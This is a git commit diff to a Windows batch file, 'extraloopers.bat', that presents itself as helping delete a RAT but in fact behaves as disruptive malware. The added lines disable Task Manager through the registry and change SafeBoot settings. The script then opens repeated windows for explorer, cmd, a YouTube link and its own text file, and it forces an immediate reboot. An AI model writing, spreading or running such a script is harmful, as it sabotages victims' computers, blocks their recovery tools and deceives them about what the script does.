0876260cb2eb3bb378588ea5e1101230c1d3c581
Apathy <88778112+Apathyy322@users.noreply.github.com>
2024-07-06 12:40:32 +0300

    Add files via upload

--- extraloopers.bat
+++ extraloopers.bat
@@ -11,16 +11,18 @@ echo this will help you delete RAT now:)) > "%initial_text_file%"
 
 REM Display the path of the initial text file (optional)
 echo Initial text file path: %initial_text_file%
-
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v Option /t REG_SZ /d Network /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v Option /t REG_SZ /d Network /f
 REM Open some applications
-for /l %%i in (1,1,100000) do (
+for /l %%i in (1,1,5) do (
     start "" "explorer.exe"
     start cmd.exe
     start https://www.youtube.com/watch?v=2hvNxWA1qm4
     start %initial_text_file%
 )
 
-shutdown /s /f /t 0
+shutdown /r /f /t 0
 REM Pause to keep the window open (for testing)
 pause
 REM Append text to all opened .txt files in the Temp folder
